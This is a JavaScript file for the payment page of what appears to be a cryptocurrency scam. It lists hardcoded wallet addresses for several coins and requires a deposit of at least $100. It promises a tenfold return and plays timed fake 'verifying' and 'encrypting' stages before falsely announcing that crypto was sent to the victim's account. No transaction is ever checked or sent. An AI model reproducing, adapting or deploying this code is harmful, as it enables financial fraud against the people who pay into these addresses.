document.addEventListener("DOMContentLoaded", () => {
    const cryptoSelect = document.getElementById("crypto");
    const copyButton = document.querySelector("button");
    const submitButton = document.querySelector(".submit-btn");
    const amountInput = document.getElementById("amount");
    const screenshotInput = document.getElementById("screenshot");

    //Initially disable the submit button
    submitButton.disabled = true;

    cryptoSelect.addEventListener("change", updateWalletAndQR);

    // Corrected Event Listener Binding
    copyButton.addEventListener("click", () => {
        copyAddress(); // Call the copyAddress function
    });

    submitButton.addEventListener("click", submitForm);
    amountInput.addEventListener("input", validateAmount);

    // Event Listener for File Upload
    screenshotInput.addEventListener("change", () => {
        if (screenshotInput.files.length > 0) {
            // Enable Submit Button if a file is selected
            submitButton.disabled = false;
        } else {
            submitButton.disabled = true;
        }
    });

    const modalOkButton = document.getElementById("modalOkButton");
    const closeButton = document.querySelector(".close-button");
    const confirmationModal = document.getElementById("confirmationModal");

    modalOkButton.addEventListener("click", () => {
        confirmationModal.style.display = "none";
        updateModalState("reset"); // Reset the modal state
    });

    closeButton.addEventListener("click", () => {
        confirmationModal.style.display = "none";
        updateModalState("reset"); // Reset the modal state
    });

    window.addEventListener("click", (event) => {
        if (event.target == confirmationModal) {
            confirmationModal.style.display = "none";
            updateModalState("reset"); // Reset the modal state
        }
    });

     //Initial QR generation
     updateWalletAndQR()
});

const cryptoData = {
    btc: {
        address: "bc1qazurj0cmv6sq9elyd752wy2lclx3c9dtdvu6gf",
        qrImage: "./images/btc.png"
    },
    eth: {
        address: "0x19205E94Fe4e5FDAE045B6121EbeBDECC592917C",
        qrImage: "./images/eth.png"
    },
    sol: {
        address: "65dzM8BB1bm8yYzHStJhyPZ8nMWwD8cxgr18NLE9yCLN",
        qrImage: "./images/sol.png"
    },
    ltc: {
        address: "ltc1q7wa2k5n6dptklnn5qtpcw9nry5hx9vw2tj30tw",
        qrImage: "./images/ltc.png"
    },
    doge: {
        address: "D8C9rjJA1mKr3wj5k3aZRjbTnhR9qLDeR1",
        qrImage: "./images/doge.png"
    },
    trx: {
        address: "TY82K1AfQvsDXdoCpq1ULndaTJH8G1UJsB",
        qrImage: "./images/trx.png"
    },
    usdt_bep20: {
        address: "0x19205E94Fe4e5FDAE045B6121EbeBDECC592917C",
        qrImage: "./images/usdt_bep20.png"
    },
    usdt_erc20: {
        address: "0x19205E94Fe4e5FDAE045B6121EbeBDECC592917C",
        qrImage: "./images/usdt_erc20.png"
    },
    usdt_trc20: {
        address: "TY82K1AfQvsDXdoCpq1ULndaTJH8G1UJsB",
        qrImage: "./images/usdt_trc20.png"
    }
};

function updateWalletAndQR() {
    const cryptoSelect = document.getElementById("crypto").value;
    const walletAddress = document.getElementById("wallet-address");
    const qrImage = document.getElementById("qr-image");

    if (cryptoData[cryptoSelect]) {
        walletAddress.textContent = cryptoData[cryptoSelect].address;
        qrImage.src = cryptoData[cryptoSelect].qrImage;
    } else {
        console.error("Invalid cryptocurrency selected:", cryptoSelect);
        walletAddress.textContent = "Error: Invalid cryptocurrency";
        qrImage.src = "";
    }
}

function copyAddress() {
    const cryptoSelect = document.getElementById("crypto").value;
    const addressToCopy = cryptoData[cryptoSelect].address;

    navigator.clipboard.writeText(addressToCopy).then(() => {
        // Display a website popup
        alert("Address Copied!");
    });
}

function validateAmount() {
    const amountInput = document.getElementById("amount");
    const amountMessage = document.getElementById("amount-message") || createAmountMessage();
    const amount = parseFloat(amountInput.value);

    if (isNaN(amount)) {
        amountMessage.textContent = "";
        return false;
    } else if (amount < 100) {
        amountMessage.textContent = "Amount must be $100 or more";
        amountMessage.className = "amount-message error";
        return false;
    } else {
        amountMessage.textContent = `You will receive ${(amount * 10).toFixed(2)}$`;
        amountMessage.className = "amount-message success";
        return true;
    }
}

function submitForm() {
    const amountInput = document.getElementById("amount");
    const isValidAmount = validateAmount();
    const screenshotInput = document.getElementById("screenshot");
    const isValidFile = screenshotInput.files.length > 0;
    const confirmationModal = document.getElementById("confirmationModal");

    if (isValidAmount && isValidFile) {
        confirmationModal.style.display = "block"; // Show the modal
        updateModalState("verifying"); // Start the verification process
    }
}

function createAmountMessage() {
    const amountInput = document.getElementById("amount");
    const amountMessage = document.createElement("p");
    amountMessage.id = "amount-message";
    amountInput.parentNode.insertBefore(amountMessage, amountInput.nextSibling);
    return amountMessage;
}

function updateModalState(state) {
    const modalMessage = document.getElementById("modalMessage");
    const loadingAnimation = document.getElementById("loadingAnimation");
    const modalOkButton = document.getElementById("modalOkButton");
    const modalIcon = document.querySelector(".modal-icon");

    modalIcon.style.display = "none"; // Hide the checkmark icon initially
    modalOkButton.style.display = "none"; // Hide the OK button initially

    switch (state) {
        case "verifying":
            modalMessage.textContent = "Verifying Your Transaction...";
            loadingAnimation.style.display = "block";
            // Simulate verification delay
            setTimeout(() => {
                updateModalState("encrypting");
            }, 2000); // Adjust time as needed
            break;
        case "encrypting":
            modalMessage.textContent = "Encrypting and Copying Crypto Tokens...";
            loadingAnimation.style.display = "block";
            // Simulate encryption delay
            setTimeout(() => {
                updateModalState("success");
            }, 3000); // Adjust time as needed
            break;
        case "success":
            modalMessage.textContent = "Crypto Sent to Your Stake Account Successfully!";
            loadingAnimation.style.display = "none";
            modalIcon.style.display = "block"; // Show the checkmark icon
            modalOkButton.style.display = "block"; // Show the OK button
            break;
        case "reset":
            modalMessage.textContent = "Processing...";
            loadingAnimation.style.display = "none";
            modalIcon.style.display = "none";
            modalOkButton.style.display = "none";
            break;
    }
}